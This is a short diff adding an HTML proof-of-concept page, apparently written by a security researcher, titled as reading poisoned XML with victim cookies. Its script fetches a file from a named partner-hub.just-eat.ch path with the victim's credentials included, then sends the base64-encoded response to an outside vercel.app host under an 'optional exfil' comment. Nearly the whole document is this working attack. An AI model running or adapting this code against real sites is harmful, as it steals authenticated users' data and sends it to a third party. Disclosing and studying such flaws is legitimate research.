@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+<body>
+<h3>PoC – reading poisoned XML with victim cookies</h3>
+<button onclick="go()">Fetch</button>
+<pre id="out"></pre>
+<script>
+function go(){
+  fetch('https://partner-hub.just-eat.ch/global/POISONED_BY_RESEARCHER_TIMESTAMP.js',
+        {credentials:'include'})
+  .then(r=>r.text())
+  .then(t=>{
+      document.getElementById('out').textContent = t;
+      // optional exfil
+      fetch('https://payloads-three.vercel.app/POC1.html?c='+btoa(t),{mode:'no-cors'});
+  })
+  .catch(e=>alert(e));
+}
+</script>
+</body>
+</html>
